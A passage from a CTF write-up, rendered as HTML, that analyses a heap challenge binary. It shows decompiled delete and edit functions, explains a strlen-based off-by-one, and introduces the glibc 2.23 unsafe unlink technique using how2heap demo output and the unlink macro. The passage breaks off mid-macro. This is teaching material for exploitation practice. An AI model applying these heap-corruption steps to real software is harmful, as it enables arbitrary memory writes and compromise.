+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">v1</span> <span class="o">&gt;=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">v1</span> <span class="o">&lt;=</span> <span class="mi">15</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">ptr</span><span class="p">[</span><span class="n">v1</span><span class="p">]</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">free</span><span class="p">(</span><span class="n">ptr</span><span class="p">[</span><span class="n">v1</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">      <span class="n">ptr</span><span class="p">[</span><span class="n">v1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Done!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;No double-free for you!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">else</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Out of bounds!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">canary</span> <span class="o">^</span> <span class="n">real_canary</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>It reads the the index of the chunk smartly since it checks for the negative and OOB index and then it checks if there is a chunk which is not NULL&rsquo;d already, if it&rsquo;s not then it <code>free</code>&rsquo;s the allocated chunk and makes the <code>ptr[index] = 0</code> making the UAF out of option. But clearly, it didn&rsquo;t NULL&rsquo;d the <code>free</code>&rsquo;d region, so maybe it&rsquo;ll be useful later.</p>
+<p>Lastly, we will check the <code>edit</code> function:-</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="nf">edit</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">size_t</span> <span class="n">v0</span><span class="p">;</span> <span class="c1">// ST08_8
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// [rsp+4h] [rbp-1Ch]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">buf</span><span class="p">;</span> <span class="c1">// [rsp+10h] [rbp-10h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-8h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="n">v4</span> <span class="o">=</span> <span class="nf">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">buf</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Index: &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="mi">4uLL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v2</span> <span class="o">=</span> <span class="nf">atoi</span><span class="p">((</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">v2</span> <span class="o">&gt;=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">v2</span> <span class="o">&lt;=</span> <span class="mi">15</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">ptr</span><span class="p">[</span><span class="n">v2</span><span class="p">]</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="n">v0</span> <span class="o">=</span> <span class="nf">strlen</span><span class="p">(</span><span class="n">ptr</span><span class="p">[</span><span class="n">v2</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Data: &#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">read_string</span><span class="p">(</span><span class="n">ptr</span><span class="p">[</span><span class="n">v2</span><span class="p">],</span> <span class="n">v0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Done!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;No UAF for you!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">else</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Out of bounds!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nf">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">)</span> <span class="o">^</span> <span class="n">v4</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>There&rsquo;s something fishy here, first the length for the <code>read_string</code> is calculated by <code>strlen</code> and then it is reading the data into the allocated memory. So, what is the catch here? To be more subtle, we have to know that <code>strlen</code> decided the length of a string when a NULL byte is recognized, for example if we have a string <code>HELLO\x00</code>, here it has a NULL Byte in the end, so when <code>strlen(&quot;HELLO\x00&quot;)</code> would be done, the returning value will be 5. but what if the string is not terminated by NULL byte, now since we know that in the <code>edit</code> the length for the <code>read_string</code>, since the string is not terminated by the NULL byte as we see in the <code>read_string</code> below:-</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">ssize_t</span> <span class="kr">__fastcall</span> <span class="nf">read_string</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">a1</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">a2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">ssize_t</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// rax
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="n">result</span> <span class="o">=</span> <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">a1</span><span class="p">,</span> <span class="n">a2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="kt">signed</span> <span class="kt">int</span><span class="p">)</span><span class="n">result</span> <span class="o">&lt;=</span> <span class="mi">0</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Read error!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>Now, it&rsquo;ll calculate the data only if when the NULL byte will be encountered, there&rsquo;s a off by one(kind of) vulnerability we can use. Without further ado, let&rsquo;s move on.</p>
+<h1 id="unsafe-unlink" class="relative group">Unsafe Unlink <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#unsafe-unlink" aria-label="Anchor">#</a></span></h1><p>To get along with this, since the given hint was <code>Xenial Xerus</code> which is the name of the <code>Ubuntu 16.04</code> which uses the LIBC-2.23 which, i back then had many low security checks for the heap internals, taking advantage of one of these loose checks within the <code>malloc.c</code>, we will be seeing it soon enough, the technique we will use here would be <code>Unsafe Unlink</code>, first of we will see what it is and how we will use it. To be precise, it is used when we have the global pointer address is known, in this case it&rsquo;d be <code>ptr</code>, to understand it more, we will be seeing it in practice in next section, this is more of just an introduction to unlink. So, first of all, we see the following example of the <code>Unsafe Unlink</code> from <code>how2heap</code> repository:-</p>
+<blockquote>
+<p>NOTE: This technique is not applicable on fastbin chunks.</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="err">0</span> <span class="err">[16:11:19]</span> <span class="nf">vagrant@oracle</span><span class="p">(</span><span class="no">oracle</span><span class="p">)</span> <span class="no">glibc_2.25</span> <span class="p">(</span><span class="no">master</span> <span class="err">%</span><span class="p">)</span><span class="err">&gt;</span> <span class="p">.</span><span class="err">/</span><span class="no">unsafe_unlink</span> 
+</span></span><span class="line"><span class="cl"><span class="no">Welcome</span> <span class="no">to</span> <span class="no">unsafe</span> <span class="no">unlink</span> <span class="mi">2</span><span class="no">.0</span><span class="p">!</span>
+</span></span><span class="line"><span class="cl"><span class="nf">Tested</span> <span class="no">in</span> <span class="no">Ubuntu</span> <span class="mi">14</span><span class="no">.04</span><span class="err">/</span><span class="mi">16</span><span class="no">.04</span> <span class="mi">64</span><span class="no">bit.</span>
+</span></span><span class="line"><span class="cl"><span class="nf">This</span> <span class="no">technique</span> <span class="no">can</span> <span class="no">be</span> <span class="no">used</span> <span class="no">when</span> <span class="no">you</span> <span class="no">have</span> <span class="no">a</span> <span class="no">pointer</span> <span class="no">at</span> <span class="no">a</span> <span class="no">known</span> <span class="no">location</span> <span class="no">to</span> <span class="no">a</span> <span class="no">region</span> <span class="no">you</span> <span class="no">can</span> <span class="no">call</span> <span class="no">unlink</span> <span class="no">on.</span>
+</span></span><span class="line"><span class="cl"><span class="nf">The</span> <span class="no">most</span> <span class="no">common</span> <span class="no">scenario</span> <span class="no">is</span> <span class="no">a</span> <span class="no">vulnerable</span> <span class="no">buffer</span> <span class="no">that</span> <span class="no">can</span> <span class="no">be</span> <span class="no">overflown</span> <span class="no">and</span> <span class="no">has</span> <span class="no">a</span> <span class="no">global</span> <span class="no">pointer.</span>
+</span></span><span class="line"><span class="cl"><span class="nf">The</span> <span class="no">point</span> <span class="no">of</span> <span class="no">this</span> <span class="no">exercise</span> <span class="no">is</span> <span class="no">to</span> <span class="no">use</span> <span class="no">free</span> <span class="no">to</span> <span class="no">corrupt</span> <span class="no">the</span> <span class="no">global</span> <span class="no">chunk0_ptr</span> <span class="no">to</span> <span class="no">achieve</span> <span class="no">arbitrary</span> <span class="no">memory</span> <span class="no">write.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nf">The</span> <span class="no">global</span> <span class="no">chunk0_ptr</span> <span class="no">is</span> <span class="no">at</span> <span class="mi">0x602070</span><span class="p">,</span> <span class="no">pointing</span> <span class="no">to</span> <span class="mi">0x12ee010</span>
+</span></span><span class="line"><span class="cl"><span class="nf">The</span> <span class="no">victim</span> <span class="no">chunk</span> <span class="no">we</span> <span class="no">are</span> <span class="no">going</span> <span class="no">to</span> <span class="no">corrupt</span> <span class="no">is</span> <span class="no">at</span> <span class="mi">0x12ee0a0</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nf">We</span> <span class="no">create</span> <span class="no">a</span> <span class="no">fake</span> <span class="no">chunk</span> <span class="no">inside</span> <span class="no">chunk0.</span>
+</span></span><span class="line"><span class="cl"><span class="nf">We</span> <span class="no">setup</span> <span class="no">the</span> <span class="err">&#39;</span><span class="no">next_free_chunk</span><span class="err">&#39;</span> <span class="p">(</span><span class="no">fd</span><span class="p">)</span> <span class="no">of</span> <span class="no">our</span> <span class="no">fake</span> <span class="no">chunk</span> <span class="no">to</span> <span class="no">point</span> <span class="no">near</span> <span class="no">to</span> <span class="err">&amp;</span><span class="no">chunk0_ptr</span> <span class="no">so</span> <span class="no">that</span> <span class="no">P-</span><span class="err">&gt;</span><span class="no">fd-</span><span class="err">&gt;</span><span class="no">bk</span> <span class="err">=</span> <span class="no">P.</span>
+</span></span><span class="line"><span class="cl"><span class="nf">We</span> <span class="no">setup</span> <span class="no">the</span> <span class="err">&#39;</span><span class="no">previous_free_chunk</span><span class="err">&#39;</span> <span class="p">(</span><span class="no">bk</span><span class="p">)</span> <span class="no">of</span> <span class="no">our</span> <span class="no">fake</span> <span class="no">chunk</span> <span class="no">to</span> <span class="no">point</span> <span class="no">near</span> <span class="no">to</span> <span class="err">&amp;</span><span class="no">chunk0_ptr</span> <span class="no">so</span> <span class="no">that</span> <span class="no">P-</span><span class="err">&gt;</span><span class="no">bk-</span><span class="err">&gt;</span><span class="no">fd</span> <span class="err">=</span> <span class="no">P.</span>
+</span></span><span class="line"><span class="cl"><span class="nf">With</span> <span class="no">this</span> <span class="no">setup</span> <span class="no">we</span> <span class="no">can</span> <span class="no">pass</span> <span class="no">this</span> <span class="no">check</span><span class="p">:</span> <span class="p">(</span><span class="no">P-</span><span class="err">&gt;</span><span class="no">fd-</span><span class="err">&gt;</span><span class="no">bk</span> <span class="p">!</span><span class="err">=</span> <span class="no">P</span> <span class="err">||</span> <span class="no">P-</span><span class="err">&gt;</span><span class="no">bk-</span><span class="err">&gt;</span><span class="no">fd</span> <span class="p">!</span><span class="err">=</span> <span class="no">P</span><span class="p">)</span> <span class="err">==</span> <span class="no">False</span>
+</span></span><span class="line"><span class="cl"><span class="nf">Fake</span> <span class="no">chunk</span> <span class="no">fd</span><span class="p">:</span> <span class="mi">0x602058</span>
+</span></span><span class="line"><span class="cl"><span class="nf">Fake</span> <span class="no">chunk</span> <span class="no">bk</span><span class="p">:</span> <span class="mi">0x602060</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nf">We</span> <span class="no">assume</span> <span class="no">that</span> <span class="no">we</span> <span class="no">have</span> <span class="no">an</span> <span class="no">overflow</span> <span class="no">in</span> <span class="no">chunk0</span> <span class="no">so</span> <span class="no">that</span> <span class="no">we</span> <span class="no">can</span> <span class="no">freely</span> <span class="no">change</span> <span class="no">chunk1</span> <span class="no">metadata.</span>
+</span></span><span class="line"><span class="cl"><span class="nf">We</span> <span class="no">shrink</span> <span class="no">the</span> <span class="no">size</span> <span class="no">of</span> <span class="no">chunk0</span> <span class="p">(</span><span class="no">saved</span> <span class="no">as</span> <span class="err">&#39;</span><span class="no">previous_size</span><span class="err">&#39;</span> <span class="no">in</span> <span class="no">chunk1</span><span class="p">)</span> <span class="no">so</span> <span class="no">that</span> <span class="no">free</span> <span class="no">will</span> <span class="no">think</span> <span class="no">that</span> <span class="no">chunk0</span> <span class="no">starts</span> <span class="no">where</span> <span class="no">we</span> <span class="no">placed</span> <span class="no">our</span> <span class="no">fake</span> <span class="no">chunk.</span>
+</span></span><span class="line"><span class="cl"><span class="nf">It</span><span class="err">&#39;</span><span class="no">s</span> <span class="no">important</span> <span class="no">that</span> <span class="no">our</span> <span class="no">fake</span> <span class="no">chunk</span> <span class="no">begins</span> <span class="no">exactly</span> <span class="no">where</span> <span class="no">the</span> <span class="no">known</span> <span class="no">pointer</span> <span class="no">points</span> <span class="no">and</span> <span class="no">that</span> <span class="no">we</span> <span class="no">shrink</span> <span class="no">the</span> <span class="no">chunk</span> <span class="no">accordingly</span>
+</span></span><span class="line"><span class="cl"><span class="nf">If</span> <span class="no">we</span> <span class="no">had</span> <span class="err">&#39;</span><span class="no">normally</span><span class="err">&#39;</span> <span class="no">freed</span> <span class="no">chunk0</span><span class="p">,</span> <span class="no">chunk1.previous_size</span> <span class="no">would</span> <span class="no">have</span> <span class="no">been</span> <span class="mi">0x90</span><span class="p">,</span> <span class="no">however</span> <span class="no">this</span> <span class="no">is</span> <span class="no">its</span> <span class="no">new</span> <span class="no">value</span><span class="p">:</span> <span class="mi">0x80</span>
+</span></span><span class="line"><span class="cl"><span class="nf">We</span> <span class="no">mark</span> <span class="no">our</span> <span class="no">fake</span> <span class="no">chunk</span> <span class="no">as</span> <span class="no">free</span> <span class="no">by</span> <span class="no">setting</span> <span class="err">&#39;</span><span class="no">previous_in_use</span><span class="err">&#39;</span> <span class="no">of</span> <span class="no">chunk1</span> <span class="no">as</span> <span class="no">False.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nf">Now</span> <span class="no">we</span> <span class="no">free</span> <span class="no">chunk1</span> <span class="no">so</span> <span class="no">that</span> <span class="no">consolidate</span> <span class="no">backward</span> <span class="no">will</span> <span class="no">unlink</span> <span class="no">our</span> <span class="no">fake</span> <span class="no">chunk</span><span class="p">,</span> <span class="no">overwriting</span> <span class="no">chunk0_ptr.</span>
+</span></span><span class="line"><span class="cl"><span class="nf">You</span> <span class="no">can</span> <span class="no">find</span> <span class="no">the</span> <span class="no">source</span> <span class="no">of</span> <span class="no">the</span> <span class="no">unlink</span> <span class="no">macro</span> <span class="no">at</span> <span class="no">https</span><span class="p">:</span><span class="c1">//sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nf">v</span>
+</span></span><span class="line"><span class="cl"><span class="nf">At</span> <span class="no">this</span> <span class="no">point</span> <span class="no">we</span> <span class="no">can</span> <span class="no">use</span> <span class="no">chunk0_ptr</span> <span class="no">to</span> <span class="no">overwrite</span> <span class="no">itself</span> <span class="no">to</span> <span class="no">point</span> <span class="no">to</span> <span class="no">an</span> <span class="no">arbitrary</span> <span class="no">location.</span>
+</span></span><span class="line"><span class="cl"><span class="nf">chunk0_ptr</span> <span class="no">is</span> <span class="no">now</span> <span class="no">pointing</span> <span class="no">where</span> <span class="no">we</span> <span class="no">want</span><span class="p">,</span> <span class="no">we</span> <span class="no">use</span> <span class="no">it</span> <span class="no">to</span> <span class="no">overwrite</span> <span class="no">our</span> <span class="no">victim</span> <span class="no">string.</span>
+</span></span><span class="line"><span class="cl"><span class="nf">Original</span> <span class="no">value</span><span class="p">:</span> <span class="no">Hello</span><span class="p">!</span><span class="err">~</span>
+</span></span><span class="line"><span class="cl"><span class="nf">New</span> <span class="no">Value</span><span class="p">:</span> <span class="no">BBBBAAAA</span>
+</span></span></code></pre></div><p>The binary speak for itself, but let&rsquo;s see, first of all we have a global array which contains the pointers to the allocated memory regions stored in the heap. Here, we have the global pointer stored at <code>0x602070</code> stored in the BSS region, now according to the example, it is pointing to the <code>0x12ee010</code> which is the first allocated chunk, next the victim chunk here is <code>0x12ee0a0</code>, when the example says it creates a fake chunk withing the <code>chunk0</code> it means we are creating a fake <code>free</code>&rsquo;d chunk, which looks like:-</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl">    <span class="nf">chunk-</span><span class="err">&gt;</span> <span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span>
+</span></span><span class="line"><span class="cl">	    <span class="err">|</span>             <span class="nf">Size</span> <span class="no">of</span> <span class="no">previous</span> <span class="no">chunk</span>                            <span class="err">|</span>
+</span></span><span class="line"><span class="cl">	    <span class="err">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span>
+</span></span><span class="line"><span class="cl">    <span class="err">`</span><span class="nl">head:</span><span class="err">&#39;</span> <span class="err">|</span>             <span class="nf">Size</span> <span class="no">of</span> <span class="no">chunk</span><span class="p">,</span> <span class="no">in</span> <span class="no">bytes</span>                         <span class="err">|</span><span class="no">P</span><span class="err">|</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">mem-</span><span class="err">&gt;</span> <span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span>
+</span></span><span class="line"><span class="cl">	    <span class="err">|</span>             <span class="nf">Forward</span> <span class="no">pointer</span> <span class="no">to</span> <span class="no">next</span> <span class="no">chunk</span> <span class="no">in</span> <span class="no">list</span>             <span class="err">|</span>
+</span></span><span class="line"><span class="cl">	    <span class="err">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span>
+</span></span><span class="line"><span class="cl">	    <span class="err">|</span>             <span class="nf">Back</span> <span class="no">pointer</span> <span class="no">to</span> <span class="no">previous</span> <span class="no">chunk</span> <span class="no">in</span> <span class="no">list</span>            <span class="err">|</span>
+</span></span><span class="line"><span class="cl">	    <span class="err">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span>
+</span></span><span class="line"><span class="cl">	    <span class="err">|</span>             <span class="nf">Unused</span> <span class="no">space</span> <span class="p">(</span><span class="no">may</span> <span class="no">be</span> <span class="mi">0</span> <span class="no">bytes</span> <span class="no">long</span><span class="p">)</span>                <span class="p">.</span>
+</span></span><span class="line"><span class="cl">	    <span class="err">.</span>                                                               <span class="err">.</span>
+</span></span><span class="line"><span class="cl">	    <span class="err">.</span>                                                               <span class="err">|</span>
+</span></span><span class="line"><span class="cl"><span class="nf">nextchunk-</span><span class="err">&gt;</span> <span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span>
+</span></span><span class="line"><span class="cl">    <span class="err">`</span><span class="nl">foot:</span><span class="err">&#39;</span> <span class="err">|</span>             <span class="nf">Size</span> <span class="no">of</span> <span class="no">chunk</span><span class="p">,</span> <span class="no">in</span> <span class="no">bytes</span>                           <span class="err">|</span>
+</span></span><span class="line"><span class="cl">	    <span class="err">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span>
+</span></span></code></pre></div><p>We create a fake chunk where the <code>fd</code> pointer points to the <code>0x602058</code> and the <code>bk</code> pointer points to the <code>0x602060</code>, as mentioned the example assumes we have overflow to manipulate the metadata of chunk i.e. <code>prev_size</code> and <code>size</code> or even <code>fd</code> or <code>bk</code>, in the example it clears out the <code>PREV_IN_USE</code> which is responsible for indicating if the chunk is in use or not by the program in one way or another. So, after that when we free the chunk we clear the <code>PREV_IN_USE</code> bit off, since we added a fake in the chunk before that, the heap manager will try to unlink the free&rsquo;d chunk to make the heap more efficient for the next allocation. In the GLIBC-2.23 has the unlink mechanism as follows:-</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl">    <span class="cm">/* consolidate backward */</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">if</span> <span class="p">(!</span><span class="no">prev_inuse</span><span class="p">(</span><span class="no">p</span><span class="p">))</span> <span class="err">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">prevsize</span> <span class="err">=</span> <span class="no">p-</span><span class="err">&gt;</span><span class="no">prev_size</span><span class="c1">;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="nf">size</span> <span class="err">+=</span> <span class="no">prevsize</span><span class="c1">;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="nf">p</span> <span class="err">=</span> <span class="no">chunk_at_offset</span><span class="p">(</span><span class="no">p</span><span class="p">,</span> <span class="p">-((</span><span class="no">long</span><span class="p">)</span> <span class="no">prevsize</span><span class="p">))</span><span class="c1">;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="nf">unlink</span><span class="p">(</span><span class="no">av</span><span class="p">,</span> <span class="no">p</span><span class="p">,</span> <span class="no">bck</span><span class="p">,</span> <span class="no">fwd</span><span class="p">)</span><span class="c1">;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="err">}</span>
+</span></span></code></pre></div><p>What we would be doing is the same as backward consolidation, going over this piece of the code we see that the it first checks if the <code>prev_inuse</code> is not 0, then it gets the <code>prev_size</code> from the chunk header, next it gets the  chunk offset and then calls the <code>unlink</code>, let&rsquo;s see the <code>unlink</code> snippet.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="c1">#define unlink(AV, P, BK, FD) {                                            \
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">if</span> <span class="p">(</span><span class="no">__builtin_expect</span> <span class="p">(</span><span class="no">chunksize</span><span class="p">(</span><span class="no">P</span><span class="p">)</span> <span class="p">!</span><span class="err">=</span> <span class="no">prev_size</span> <span class="p">(</span><span class="no">next_chunk</span><span class="p">(</span><span class="no">P</span><span class="p">)),</span> <span class="mi">0</span><span class="p">))</span>      <span class="err">\</span>
